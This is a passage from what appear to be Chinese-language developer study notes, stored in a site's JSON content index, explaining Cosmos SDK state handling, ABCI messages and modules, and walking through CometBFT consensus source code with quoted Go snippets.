ABCI方法；它通过将deliveryState写入应用程序的内部状态来同步所有状态转换。一旦提交了状态更改，checkState就会从最近提交的状态重新开始，deliveryState会重置为nil，以保持一致并反映更改\n请注意，并非所有区块都有相同数量的交易，共识可能会导致零区块或完全没有区块？？？？？？。在公共区块链网络中，验证器也可能是拜占庭式的或恶意的，这可能会阻止Tx在区块链中提交。可能的恶意行为包括提议者决定通过将Tx从块中排除来审查Tx，或者验证器投票反对该块。\n此时，Tx的事务生命周期已经结束：节点已经验证了它的有效性，通过执行状态更改来传递它，并提交这些更改。Tx本身以[]字节的形式存储在一个块中，并附加到区块链中\ncore concepts\nbaseApp\ncosmos sdk的基本类型，实现了ABCI接口（所以开发者不需要考虑实现），用于和cometBFT通信\ntype App struct {\n  // reference to a BaseApp\n  *baseapp.BaseApp\n \n  // list of application store keys\n \n  // list of application keepers\n \n  // module manager\n}\ntype definition\nbaseapp 的关键组件如下：\n\nCommitMutiStore: 多个存储，对应相应的模块，一笔模块相关的交易会改变相关的存储\nDatabase: 持久化 commitMutiStore\nMsg service router :  将sdk.msg 路由到适当模块的msg service 处理，不同于ABCI Msg\nGrpc query router:  路由到适当模块处理查询\nTxdecoder: 解码cometBFT 传过来的事务字节\nAntHandler: 用于在收到交易时处理签名验证、费用支付和其他消息执行前检查。它在CheckTx/RecheckTx和DeliverTx期间执行。\nInitChainer, BeginBlocker and EndBlocker:这些是应用程序从底层CometBFT引擎接收InitChain、BeginBlock和EndBlock ABCI消息时执行的函数\n\n各个阶段的缓存状态：\n\ncheckstate : 在CheckTx期间更新，并在提交时重置\nDeliverstate:在DeliverTx期间更新，在Commit时设置为nil，并在BeginBlock上重新初始化。\nprocessProposalState:processProposalState 更新\nprepareProposalState: prepareProposalState更新\n\n状态更新 需要重点了解原理\n我们通过使用一种称为存储分支的机制？？？？（由CacheWrap函数执行）导出四个易失性状态\n\nInitChain State Updates\n在InitChain过程中，通过分支根？？？CommitMultiStore来设置四种易失性状态，checkState、prepareProposalState、processProposalState和deliveryState。任何后续的读取和写入都发生在CommitMultiStore的分支版本上？？？。为了避免不必要的到主状态的往返，对分支存储的所有读取都被缓存。\n\nCheckTx State Updates\n在CheckTx期间，基于根存储中最后一个提交状态的checkState用于任何读取和写入。在这里，我们只执行AnteHandler，并验证事务中每个消息都存在服务路由器。注意，当我们执行AnteHandler时，我们对已经分支的checkState进行分支。这有一个副作用，即如果AnteHandler失败，状态转换将不会反映在checkState中——即checkState只在成功时更新。\n\nPrepareProposal State Updates\n在PrepareProposal期间，通过分支根CommitMultiStore来设置prepareProposalState。prepareProposalState用于在PrepareProposal阶段发生的任何读取和写入。该函数使用内存池的Select（）方法来迭代事务。然后调用runTx，它对每个事务进行编码和验证，然后执行AnteHandler。如果成功，将返回有效的事务，包括在执行建议期间生成的事件、标记和数据。所描述的行为是默认处理程序的行为，应用程序可以灵活地定义自己的自定义内存池处理程序。\n\nProcessProposal State Updates\n在ProcessProposal过程中，processProposalState是根据根存储中的最后一个提交状态设置的，用于处理从验证器接收的签名提案。在这种状态下，调用runTx并执行AnteHandler，并且在这种状态中使用的上下文是用来自标头和主状态的信息构建的，包括也设置的最低天然气价格。我们再次强调，所描述的行为是默认处理程序的行为，应用程序可以灵活地定义自己的自定义内存池处理程序\n\nBeginBlock State Updates\n在BeginBlock期间，deliveryState被设置为在随后的DeliverTx ABCI消息中使用。deliveryState基于根存储中最后一个提交的状态，并且是分支的。请注意，deliveryState在提交时设置为nil。\n\nDeliverTx State Updates\nDeliverTx的状态流几乎与CheckTx相同，只是deliveryState上发生状态转换，并且执行事务中的消息。与CheckTx类似，状态转换发生在双分支状态deliveryState上。成功执行消息会导致写入被提交到deliveryState。请注意，如果消息执行失败，来自AnteHandler的状态转换将被持久化。\n\nCommit State Updates\n在提交过程中，deliveryState中发生的所有状态转换最终都会写入根CommitMultiStore，然后提交到磁盘并生成新的应用程序根哈希。这些状态转换现在被认为是最终的。最后，checkState设置为新提交的状态，deliveryState设置为nil以在BeginBlock上重置\n\nParamStore\n在InitChain过程中，RequestInitChaine提供ConsensusParams，其中除了证据参数外，还包含与区块执行相关的参数，如最大气体和大小。如果这些参数不是nil，则在BaseApp的ParamStore中进行设置。在幕后，ParamStore由x/consensus_params模块管理。这允许通过链上治理来调整参数，这是一个很好的去中心化设计\nService Routers\n当应用程序接收到消息和查询时，必须将它们路由到适当的模块才能进行处理。路由是通过BaseApp完成的，它为消息保存一个msgServiceRouter，为查询保存一个grpcQueryRouter。\nmsg service router\n为此，BaseApp持有一个msgServiceRouter，它将完全限定的服务方法（字符串，在每个模块的Protobuf-Msg服务中定义）映射到相应模块的MsgServer实现\n应用程序的模块管理器（通过RegisterServices方法）使用所有路由初始化应用程序的msgServiceRouter，模块管理器本身使用应用程序构造函数中的所有应用程序模块初始化.\ngrpc query router\nBaseApp拥有一个grpcQueryRouter，它将模块的完全限定服务方法（字符串，在其Protobuf Query gRPC中定义）映射到其QueryServer实现。grpcQueryRouter在查询处理的初始阶段被调用，可以通过直接向gRPC端点发送gRPC查询，也可以通过CometBFT RPC端点上的query ABCI消息。\n与msgServiceRouter一样，grpcQueryRouter使用应用程序的模块管理器（通过RegisterServices方法）使用所有查询路由进行初始化，模块管理器本身使用应用程序构造函数中的所有应用程序模块进行初始化。\nABCI msgs\nABCI 是一个通用接口（由comeBFT定义），通过它连接状态机和共识引擎。共识引擎会发出ABCI消息，供app 采取行动，消息如下：\n\n\nPrepare Proposal\n\n\nProcess Proposal\n\n\nCheckTx\n\n\nDeliverTx\n\n\nInitchain:主要用于初始化参数和状态\n\n\nbegin block\n\n\nEnd block\n\n\ncommit\n\n\ninfo\n\n\nquery\n\n\nTransaction\ntransaction process\n消息（或sdk.Msgs）是特定于模块的对象，用于触发所属模块范围内的状态转换。模块开发人员通过向Protobuf-Msg服务添加方法来定义模块的消息，并实现相应的MsgServer。\n每个sdk.Msgs都与一个Protobuf-Msg服务RPC相关，该服务在每个模块的tx.proto文件中定义。SDK应用程序路由器会自动将每个SDK.Msg映射到相应的RPC。Protobuf为每个模块Msg服务生成一个MsgServer接口，模块开发人员需要实现这个接口。这种设计将更多的责任交给了模块开发人员，允许应用程序开发人员重用通用功能，而不必重复实现状态转换逻辑。\n要了解有关Protobuf-Msg服务以及如何实现MsgServer的更多信息，请单击此处。\n虽然消息包含状态转换逻辑的信息，但事务的其他元数据和相关信息存储在TxBuilder和Context中\ncontext\n包装了go 的context ,设计理念以及他的应用场景？？？？上下文是事务处理不可或缺的一部分，因为它允许模块轻松访问多存储中各自的存储，并检索事务上下文，如块头和gadmeter\nStore branching （context的用途）\nContext包含一个MultiStore，它允许使用CacheMultiStore进行分支和缓存功能（缓存MultiStore中的查询以避免将来的往返）。每个KVStore都在一个安全且隔离的临时存储中进行分支。进程可以自由地将更改写入CacheMultiStore。如果在没有问题的情况下执行状态转换序列，则可以将存储分支提交到序列末尾的底层存储，或者在出现问题时忽略它们。上下文的使用模式如下：\n进程从其父进程接收上下文ctx，该上下文ctx提供执行该进程所需的信息。\nctx.ms是一个分支存储，即多存储的一个分支，这样进程就可以在执行时对状态进行更改，而无需更改原始的alctx.ms。这有助于保护底层多存储，以防在执行过程中的某个时刻需要恢复更改。\n进程可以在执行时从ctx读取和写入。它可以调用一个子流程，并根据需要将ctx传递给它。\n当子流程返回时，它会检查结果是成功还是失败。如果发生故障，则无需执行任何操作——只需丢弃分支ctx。如果成功，可以通过Write（）将对CacheMultiStore所做的更改提交到原始ctx.ms。\nstore\ncosmos sdk 的存储设计架构：\n+-----------------------------------------------------+\n|                                                     |\n|    +--------------------------------------------+   |\n|    |                                            |   |\n|    |  KVStore 1 - Manage by keeper of Module 1  |\n|    |                                            |   |\n|    +--------------------------------------------+   |\n|                                                     |\n|    +--------------------------------------------+   |\n|    |                                            |   |\n|    |  KVStore 2 - Manage by keeper of Module 2  |   |\n|    |                                            |   |\n|    +--------------------------------------------+   |\n|                                                     |\n|    +--------------------------------------------+   |\n|    |                                            |   |\n|    |  KVStore 3 - Manage by keeper of Module 2  |   |\n|    |                                            |   |\n|    +--------------------------------------------+   |\n|                                                     |\n|    +--------------------------------------------+   |\n|    |                                            |   |\n|    |  KVStore 4 - Manage by keeper of Module 3  |   |\n|    |                                            |   |\n|    +--------------------------------------------+   |\n|                                                     |\n|    +--------------------------------------------+   |\n|    |                                            |   |\n|    |  KVStore 5 - Manage by keeper of Module 4  |   |\n|    |                                            |   |\n|    +--------------------------------------------+   |\n|                                                     |\n|                    Main Multistore                  |\n|                                                     |\n+-----------------------------------------------------+\n \n                   Application&#039;s State\nmultistore\nmultistore 是 store的存储，Cosmos SDK中使用的Multistore的主要类型是CommitMultiStore，它是Multistore接口的扩展\n！！！！？？？？I AVL Tree 详解\nival doc \nGrpc 网关。rest路由\nObject-Capability Model\n对象能力系统的结构特性有利于代码设计中的模块化，并确保代码实现中的可靠封装。\n这些结构属性有助于分析对象能力程序或操作系统的一些安全属性。其中一些属性，特别是信息流属性，可以在对象引用和连接级别进行分析，而不依赖于确定对象行为的代码的任何知识或分析。\n因此，在存在包含未知且可能是恶意代码的新对象时，可以建立和维护这些安全属性。\n这些结构特性源于管理对现有对象的访问的两个规则：\n只有当对象A包含对B的引用时，对象A才能向B发送消息。\n只有当对象A接收到包含对C的引用的消息时，对象A才能获得对C的参考。由于这两个规则，一个对象只能通过预先存在的引用链获得对另一个对象的引用。简而言之，“只有连接才能产生连接。\n对象模型\np ro to bu f\nbuf.build/cosmos/cosmos-sdk/docs/main\nIn-Place Store Migrations\n必须非常理解，比较危险，手动升级模块\n这个需要自己动手尝试\n构建模块\nCosmos SDK可以被认为是区块链开发的Ruby on Rails。它的核心提供了每个区块链应用程序所需的基本功能，如ABCI的样板实现，以与底层共识引擎通信，多存储持久状态，形成完整节点的服务器和处理查询的接口。\nCosmos SDK模块可以被视为状态机中的小型状态机。它们通常使用主多存储中的一个或多个KVStores以及消息类型的子集来定义状态的子集。这些消息由Cosmos SDK核心的主要组件之一BaseApp路由到定义它们的模块Protobuf-Msg服务\n如何处理构建模块\n设计原则如下：\n\nComposability：思考是否要和核心模块或其他模块集成\nSpecialization：模块应该专门化的，不得将多个功能集成到一个模块中，关注点分离设计思想，便于升级\nCapabilities：大多数模块需要读取和/或写入其他模块的存储区。然而，在开源环境中，某些模块可能是恶意的。这就是为什么模块开发人员不仅需要仔细考虑他们的模块如何与其他模块交互，还需要仔细考虑如何访问模块的存储。Cosmos SDK采用了一种面向功能的方法来实现模块间安全。这意味着由模块定义的每个存储都由一个密钥访问，该密钥由模块的管理员持有。该管理员定义了如何访问商店以及在什么条件下访问。访问模块的存储是通过将引用传递给模块的keeper来完成的。\n\nApplication Module Interfaces\n应用程序模块接口的存在有助于将模块组合在一起，形成一个功能强大的Cosmos SDK应用程序。有4个主要的应用程序模块接口：\n\nAppmoudlebasic:用于独立的模块功能。\nAppmoudle:用于相互依赖的模块功能\nappmoudleGenesis:用于相互依赖的genesis相关模块功能\nGenesisOnlyAppModule:定义仅具有导入/导出功能的AppModule\n\nappmoudlebasic\n// AppModuleBasic is the standard form for basic non-dependant elements of an application module.\ntype AppModuleBasic interface {\n\tHasName\n\tRegisterLegacyAminoCodec(*codec.LegacyAmino)\n\tRegisterInterfaces(codectypes.InterfaceRegistry)\n \n\t// client functionality\n  //为模块注册gRPC路由\n\tRegisterGRPCGatewayRoutes(client.Context, *runtime.ServeMux)\n\tGetTxCmd() *cobra.Command\n\tGetQueryCmd() *cobra.Command\n}\nappmoudle\n// AppModule is the form for an application module. Most of\n// its functionality has been moved to extension interfaces.\ntype AppModule interface {\n\tAppModuleBasic\n}\nm s g SERVICES   时序图怎么看？？？？？\n此图显示了Protobuf-Msg服务的典型结构，以及消息如何在模块中传播。\n\nkeeper\nmodule Genesis\n每当进行状态导出时，都会执行ExportGenesis方法。它获取模块管理的状态子集的最新已知版本，并从中创建一个新的GenesisState。这主要用于需要通过硬分叉升级链时\ngrpc网关将REST调用转换为grpc调用，这对于不使用grpc的客户端可能很有用。 auto cli 包的使用\n升级模块，需要实际操作\nModules depinject-ready  新加的内容"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/main_components":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos-sdk/main_components","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/Cosmos sdk/main_components.md","title":"main_components","links":[],"tags":[],"content":"通过 dilivertx 传送给其他节点的APP\nAPP处理事务如下：\n\nDecode transactions received from the CometBFT consensus engine\nExtract messages from transactions and do basic sanity checks.\nRoute each message to the appropriate module\nCommit state changes.\n\nbaseapp\nbaseapp是Cosmos SDK应用程序的样板实现。它附带了ABCI的实现，以处理与底层共识引擎的连接。通常，Cosmos SDK应用程序通过将baseapp嵌入app.go来扩展它。\n以下是Cosmos SDK演示应用程序simapp的一个示例：\ntype SimApp struct {\n\t*baseapp.BaseApp\n\tlegacyAmino       *codec.LegacyAmino\n\tappCodec          codec.Codec\n\ttxConfig          client.TxConfig\n\tinterfaceRegistry types.InterfaceRegistry\n \n\t// keys to access the substores\n\tkeys    map[string]*storetypes.KVStoreKey\n\ttkeys   map[string]*storetypes.TransientStoreKey\n\tmemKeys map[string]*storetypes.MemoryStoreKey\n \n\t// keepers\n\tAccountKeeper         authkeeper.AccountKeeper\n\tBankKeeper            bankkeeper.Keeper\n\t...\n \n\t// the module manager\n\tModuleManager *module.Manager\n \n\t// simulation manager\n\tsm *module.SimulationManager\n \n\t// module configurator\n\tconfigurator module.Configurator\n}\nbaseapp的目标是在存储和可扩展状态机之间提供一个安全的接口，同时尽可能少地定义状态机（忠于ABCI）\nMultistore\nCosmos SDK为持久化状态提供了一个Multistore。Multistore允许开发人员声明任意数量的KVStores。这些KVStores只接受[]字节类型作为值，因此任何自定义结构在存储之前都需要使用编解码器进行编组。\nMultistore抽象用于将状态划分为不同的分区，每个分区由自己的模块管理。\nModules\nCosmos SDK应用程序是通过聚合一组可互操作的模块来构建的。每个模块都定义了状态的一个子集，并包含自己的消息/事务处理器，而Cosmos SDK负责将每个消息路由到各自的模块。\n以下是当事务在有效块中接收时，每个完整节点的应用程序如何处理事务的简化视图：\n                                      +\n                                      |\n                                      |  Transaction relayed from the full-node&#039;s\n                                      |  CometBFT engine to the node&#039;s application\n                                      |  via DeliverTx\n                                      |\n                                      |\n                +---------------------v--------------------------+\n                |                 APPLICATION                    |\n                |                                                |\n                |     Using baseapp&#039;s methods: Decode the Tx,    |\n                |     extract and route the message(s)           |\n                |                                                |\n                +---------------------+--------------------------+\n                                      |\n                                      |\n                                      |\n                                      +---------------------------+\n                                                                  |\n                                                                  |\n                                                                  |  Message routed to\n                                                                  |  the correct module\n                                                                  |  to be processed\n                                                                  |\n                                                                  |\n+----------------+  +---------------+  +----------------+  +------v----------+\n|                |  |               |  |                |  |                 |\n|  AUTH MODULE   |  |  BANK MODULE  |  | STAKING MODULE |  |   GOV MODULE    |\n|                |  |               |  |                |  |                 |\n|                |  |               |  |                |  | Handles message,|\n|                |  |               |  |                |  | Updates state   |\n|                |  |               |  |                |  |                 |\n+----------------+  +---------------+  +----------------+  +------+----------+\n                                                                  |\n                                                                  |\n                                                                  |\n                                                                  |\n                                       +--------------------------+\n                                       |\n                                       | Return result to CometBFT\n                                       | (0=Ok, 1=Err)\n                                       v\n每个模块都可以看作是一个小型状态机。开发人员需要定义模块处理的状态的子集，以及修改状态的自定义消息类型（注意：消息是由baseapp从事务中提取的）。通常，每个模块在多存储中声明自己的KVStore，以持久化其定义的状态的子集。大多数开发人员在构建自己的模块时都需要访问其他第三方模块。鉴于Cosmos SDK是一个开放的框架，一些模块可能是恶意的，这意味着需要安全原则来解释模块间的交互。这些原则是基于对象能力的。在实践中，这意味着不是让每个模块为其他模块保留访问控制列表，而是每个模块实现称为keeper的特殊对象，这些对象可以传递给其他模块以授予预定义的一组功能。"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cometBFT/ABCI++":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cometBFT/ABCI++","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cometBFT/ABCI++.md","title":"ABCI++","links":[],"tags":[],"content":""},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cometBFT/cometBFT架构设计":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cometBFT/cometBFT架构设计","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cometBFT/cometBFT架构设计.md","title":"cometBFT架构设计","links":[],"tags":[],"content":""},"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cometBFT/cometBFT源码分析":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cometBFT/cometBFT源码分析","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/cometBFT/cometBFT源码分析.md","title":"cometBFT源码分析","links":["tags/疑问"],"tags":["疑问"],"content":"// start event bus\n// get State\n// start the machine\n\nenterNewRound\nstartRoutines\n\n// wait for proposal\n// wait for prevote\n// wait for precommit\n// wait to finish commit, propose in next height\nensureNewBlock(newBlockCh, height)\n// finalizeCommit\n//\n\nstate 负责什么工作\n监听了哪些事件\n\nvoteCh := subscribeUnBuffered(cs.eventBus, types.EventQueryVote)\npropCh := subscribe(cs.eventBus, types.EventQueryCompleteProposal)\nnewRoundCh := subscribe(cs.eventBus, types.EventQueryNewRound)\n\n\n\n\nliukay.com/posts/4334\narxiv.org/pdf/1807.04938.pdf\n\n服务启动，进入第一轮共识\nfunc (cs *State) OnStart() error{\n  cs.loadWalFile()\n  ....\n  cs.timeoutTicker.Start()\n  ...\n  loop\n  for{\n    ??\n  }\n  cs.evsw.Start()\n  ...\n  cs.checkDoubleSigningRisk(cs.Height)\n  ...\n  go cs.receiveRoutine(0)\n  ...\n  cs.scheduleRound0(cs.GetRoundState()) // 他这个思路是往timeoutTicker发送消息，由receiveRoutine来处理，在新高度开启新round\n}\n共识消息处理\n\nreceiveRoutine\n\n处理交易\n实际这一连串的代码都是从tendermint 共识启动发出的，也就是说他的共识启动是往timeouttiker中发送超时信息，从而重置timeoutTicker计时器，然后再次触发timer.C来往cs.timeoutTicker.Chan()写入数据，从而触发handleTimeout的真正处理逻辑\nHandlemsg 和handleTimeOut\nhandleMsg:\n\npeerMsgQueue\ncs.internalMsgQueue:\n\nhandleTimeout:从tockchan获取的各种超时信息：\nRoundStepNewHeight     = RoundStepType(0x01) // Wait til CommitTime + timeoutCommit\n\tRoundStepNewRound      = RoundStepType(0x02) // Setup new round and go to RoundStepPropose\n\tRoundStepPropose       = RoundStepType(0x03) // Did propose, gossip proposal\n\tRoundStepPrevote       = RoundStepType(0x04) // Did prevote, gossip prevotes\n\tRoundStepPrevoteWait   = RoundStepType(0x05) // Did receive any +2/3 prevotes, start timeout\n\tRoundStepPrecommit     = RoundStepType(0x06) // Did precommit, gossip precommits\n\tRoundStepPrecommitWait = RoundStepType(0x07) // Did receive any +2/3 precommits, start timeout\n\tRoundStepCommit        = RoundStepType(0x08) // Entered commit state machine\n流程\nFunc (cs *State) enterNewRound(height int64, round int32)\n​\tcs.eventBus.PublishEventNewRound(cs.NewRoundEvent()) ??? 发布出去的newround别人怎么处理的\n​\tcs.enterPropose(height, round)\nenterPropose\n\n\ncs.scheduleTimeout(cs.config.Propose(round), height, round, cstypes.RoundStepPropose) 这里会开始一个超时计时器，如果在 Propose 阶段无法及时收到区块提案和所有区块部件，则节点会进入到 Prevote 阶段，以保证共识算法的正常运行\n\n\ncs.decideProposal(height, round)\n\n\ndecideProposal → defaultDecideProposal\n\n\ncs.createProposalBlock(context.TODO()): 从mempool的state/txs创建一个新的提案块。 （具体如何create 看下面的）\n\n\nblockParts, err = block.MakePartSet(types.BlockPartSizeBytes)：分解区块为一个个的64Kb的数据 (这个重点理解，运用到了merkle proof)\n\n\n构造proposal:\n\n\nNewProposal\n\n\ncs.privValidator.SignProposal\n\n\n发送proposal和区块部件（他实际是切割了区块，降低网络延迟，提高网络传输效率）\nfunc (cs *State) sendInternalMessage(mi msgInfo) {\n\tselect {\n\tcase cs.internalMsgQueue &lt;- mi:\n\tdefault:\n\t\t// NOTE: using the go-routine means our votes can\n\t\t// be processed out of order.\n\t\t// TODO: use CList here for strict determinism and\n\t\t// attempt push to internalMsgQueue in receiveRoutine\n\t\tcs.Logger.Debug(&quot;internal msg queue is full; using a go-routine&quot;)\n\t\tgo func() { cs.internalMsgQueue &lt;- mi }()\n\t}\n}\n这段代码如果不对internalMsgQueue进行限制，则可以进行DDOS攻击，会导致下面default开启大量协程，\ntendermint只是进行了1000条消息的设置\nTendermint 会对节点的行为进行监控和限制，如限制每个节点发送 mi 消息的速率，防止节点恶意发送大量消息。\nTendermint 还具有抗拒绝服务（DoS）攻击的机制，在检测到某个节点发送大量无效消息时，会将该节点列入黑名单，不再接收其消息\n\n\n接着就直接handlemsg了\n\n保存proposal和组装block，主要看下组装block(BlockPartMessage)：\n\ncs.addProposalBlockPart (这一部分可能enterPrevote 或者\ttryFinalizeCommit)\n\ncs.eventBus.PublishEventCompleteProposal(cs.CompleteProposalEvent()) 发布事件\n\n\n\nhandleCompleteProposal （这里面需要细看，我只讲直接进入到enterPrevote阶段）\n\n\n\n\n\n\n\n\n​\ncs.createProposalBlock(context.TODO())\n\n\ncs.blockExec.CreateProposalBlock(ctx, cs.Height, cs.state, lastExtCommit, proposerAddr)\n\n\n疑问\n\n为什么有自定义的函数作为参数传入\n\nyangzhe.me/2022/08/13/tendermint-bft/\n关键结构\nreactor\ntype Reactor struct {\n\tp2p.BaseReactor // BaseService + p2p.Switch\n \n\tconS *State   // 见下state\n \n\tmtx      cmtsync.RWMutex\n\twaitSync bool\n\teventBus *types.EventBus\n\trs       *cstypes.RoundState\n \n\tMetrics *Metrics\n}\nstate\ntype State struct {\n\tservice.BaseService\n \n\t// config details\n\tconfig        *cfg.ConsensusConfig\n\tprivValidator types.PrivValidator // for signing votes\n \n\t// store blocks and commits\n\tblockStore sm.BlockStore\n \n\t// create and execute blocks\n\tblockExec *sm.BlockExecutor\n \n\t// notify us if txs are available\n\ttxNotifier txNotifier\n \n\t// add evidence to the pool\n\t// when it&#039;s detected\n\tevpool evidencePool\n \n\t// internal state\n\tmtx cmtsync.RWMutex\n\tcstypes.RoundState\n\tstate sm.State // State until height-1.\n\t// privValidator pubkey, memoized for the duration of one block\n\t// to avoid extra requests to HSM\n\tprivValidatorPubKey crypto.PubKey\n \n\t// state changes may be triggered by: msgs from peers,\n\t// msgs from ourself, or by timeouts\n\tpeerMsgQueue     chan msgInfo\n\tinternalMsgQueue chan msgInfo\n\ttimeoutTicker    TimeoutTicker  \n \n\t// information about about added votes and block parts are written on this channel\n\t// so statistics can be computed by reactor\n\tstatsMsgQueue chan msgInfo\n \n\t// we use eventBus to trigger msg broadcasts in the reactor,\n\t// and to notify external subscribers, eg. through a websocket\n\teventBus *types.EventBus   // //使用eventBus来触发反应器中的消息广播，并通知外部订阅者，例如通过websocket\n \n\t// a Write-Ahead Log ensures we can recover from any kind of crash\n\t// and helps us avoid signing conflicting votes\n\twal          WAL\n\treplayMode   bool // so we don&#039;t log signing errors during replay\n\tdoWALCatchup bool // determines if we even try to do the catchup\n \n\t// for tests where we want to limit the number of transitions the state makes\n\tnSteps int\n \n\t// some functions can be overwritten for testing\n\tdecideProposal func(height int64, round int32)\n\tdoPrevote      func(height int64, round int32)\n\tsetProposal    func(proposal *types.Proposal) error\n \n\t// closed when we finish shutting down\n\tdone chan struct{}\n \n\t// synchronous pubsub between consensus state and reactor.\n\t// state only emits EventNewRoundStep and EventVote\n\tevsw cmtevents.EventSwitch // 共识状态和反应器之间的同步pubsub。状态仅发出EventNewRoundStep和EventVote\n}\nEventSwitch\ncmtevents.EventSwitch 是一个事件总线，用于在不同的模块之间传递事件。EventSwitch 的设计思想是将事件的发送者和接收者解耦，从而实现模块间的松耦合。\n具体来说，每个模块都可以将自己感兴趣的事件类型注册到 EventSwitch 中。当某个模块触发了一个事件时，EventSwitch 会将该事件发送给所有已注册的模块。这样，不同的模块就可以在不了解彼此具体实现的情况下进行协作。\n在 Tendermint 中，EventSwitch 被广泛用于不同模块之间的交互。例如，在共识模块和反应器之间，EventSwitch 被用于同步共识状态和反应器。具体来说，共识状态会触发两种类型的事件：EventNewRoundStep 和 EventVote。这些事件会被发送到 EventSwitch 中，并被订阅了这些事件类型的反应器模块接收。反应器模块会根据这些事件执行相应的操作，例如更新状态或发送消息。\n节点启动流程\n从NewRunNodeCmd开始\neventbus启动流程\neventbus 是cometBFT节点内部的消息总线，其启动最终是启动了pubsub.\nfunc (s *Server) loop(state state) {\nloop:\n\tfor cmd := range s.cmds {\n\t\tswitch cmd.op {\n\t\tcase unsub:\n\t\t\tif cmd.query != nil {\n\t\t\t\tstate.remove(cmd.clientID, cmd.query.String(), ErrUnsubscribed)\n\t\t\t} else {\n\t\t\t\tstate.removeClient(cmd.clientID, ErrUnsubscribed)\n\t\t\t}\n\t\tcase shutdown:\n\t\t\tstate.removeAll(nil)\n\t\t\tbreak loop\n\t\tcase sub:\n\t\t\tstate.add(cmd.clientID, cmd.query, cmd.subscription)\n\t\tcase pub:\n\t\t\tif err := state.send(cmd.msg, cmd.events); err != nil {\n\t\t\t\ts.Logger.Error(&quot;Error querying for events&quot;, &quot;err&quot;, err)\n\t\t\t}\n\t\t}\n\t}\n}\n这段代码实现了一个循环，用于处理来自 cmds 通道的命令。具体来说，循环会不断地从 cmds 通道中接收命令，然后根据命令类型进行相应的处理。\n在代码中，state 参数代表当前的状态，即已经订阅的客户端和事件查询。cmds 通道中的命令包括四种类型：\n\nunsub：取消订阅命令，用于取消指定客户端或查询的订阅。\nshutdown：关闭命令，用于关闭消息服务器并清空当前状态。\nsub：订阅命令，用于添加新的订阅。\npub：发布命令，用于向订阅者发送消息。\n\n当接收到 unsub 命令时，会根据命令中的参数从当前状态中移除相应的订阅。如果命令中指定了查询条件，则移除与该查询条件相匹配的订阅；否则，移除指定客户端的所有订阅。\n当接收到 shutdown 命令时，会将当前状态中的所有订阅都移除，并退出循环。\n当接收到 sub 命令时，会根据命令中的参数添加新的订阅。\n当接收到 pub 命令时，会将消息和相关的事件发送给所有匹配的订阅者。如果发送消息时出现错误，则会记录日志。\nconsensusReactor启动流程\n从NewRunNodeCmd开始，一直到reactor的onstart启动：\nfunc (conR *Reactor) OnStart() error {\n\t// start routine that computes peer statistics for evaluating peer quality\n\tgo conR.peerStatsRoutine()\n \n\tconR.subscribeToBroadcastEvents()\n\tgo conR.updateRoundStateRoutine()\n \n\tif !conR.WaitSync() {\n\t\terr := conR.conS.Start()\n\t}\n\treturn nil\n}\n\n启动计算peer统计信息以评估peer质量的协程\n订阅新round step ，并使用state上定义的内部pubsub进行投票，以便在接收时将其广播给peer。\n定期更新共识状态的RoundState\n如若没有完成状态同步，则要启动共识状态\n\n订阅的细节：\nfunc (conR *Reactor) subscribeToBroadcastEvents() {\n\tconst subscriber = &quot;consensus-reactor&quot;\n\tif err := conR.conS.evsw.AddListenerForEvent(subscriber, types.EventNewRoundStep,\n\t\tfunc(data cmtevents.EventData) {\n\t\t\tconR.broadcastNewRoundStepMessage(data.(*cstypes.RoundState))\n\t\t}); err != nil {\n\t\tconR.Logger.Error(&quot;Error adding listener for events&quot;, &quot;err&quot;, err)\n\t}\n \n\tif err := conR.conS.evsw.AddListenerForEvent(subscriber, types.EventValidBlock,\n\t\tfunc(data cmtevents.EventData) {\n\t\t\tconR.broadcastNewValidBlockMessage(data.(*cstypes.RoundState))\n\t\t}); err != nil {\n\t\tconR.Logger.Error(&quot;Error adding listener for events&quot;, &quot;err&quot;, err)\n\t}\n \n\tif err := conR.conS.evsw.AddListenerForEvent(subscriber, types.EventVote,\n\t\tfunc(data cmtevents.EventData) {\n\t\t\tconR.broadcastHasVoteMessage(data.(*types.Vote))\n\t\t}); err != nil {\n\t\tconR.Logger.Error(&quot;Error adding listener for events&quot;, &quot;err&quot;, err)\n\t}\n}\n可以看到consensus reactor订阅了三种类型的事件，EventNewRoundStep、EventValidBlock、EventVote， 当共识状态发布这些事件时候，eventswitch会将事件广播给订阅了这些事件的对象\ntimeoutTiker的启动\nfunc (t *timeoutTicker) OnStart() error {\n \n\tgo t.timeoutRoutine()\n \n\treturn nil\n}\nfunc (t *timeoutTicker) timeoutRoutine() {\n\tt.Logger.Debug(&quot;Starting timeout routine&quot;)\n\tvar ti timeoutInfo\n\tfor {\n\t\tselect {\n\t\tcase newti := &lt;-t.tickChan:\n\t\t\tt.Logger.Debug(&quot;Received tick&quot;, &quot;old_ti&quot;, ti, &quot;new_ti&quot;, newti)\n \n\t\t\t// ignore tickers for old height/round/step\n\t\t\tif newti.Height &lt; ti.Height {\n\t\t\t\tcontinue\n\t\t\t} else if newti.Height == ti.Height {\n\t\t\t\tif newti.Round &lt; ti.Round {\n\t\t\t\t\tcontinue\n\t\t\t\t} else if newti.Round == ti.Round {\n\t\t\t\t\tif ti.Step &gt; 0 &amp;&amp; newti.Step &lt;= ti.Step {\n\t\t\t\t\t\tcontinue\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n \n\t\t\t// stop the last timer\n\t\t\tt.stopTimer()\n \n\t\t\t// update timeoutInfo and reset timer\n\t\t\t// NOTE time.Timer allows duration to be non-positive\n\t\t\tti = newti\n\t\t\tt.timer.Reset(ti.Duration)\n\t\t\tt.Logger.Debug(&quot;Scheduled timeout&quot;, &quot;dur&quot;, ti.Duration, &quot;height&quot;, ti.Height, &quot;round&quot;, ti.Round, &quot;step&quot;, ti.Step)\n\t\tcase 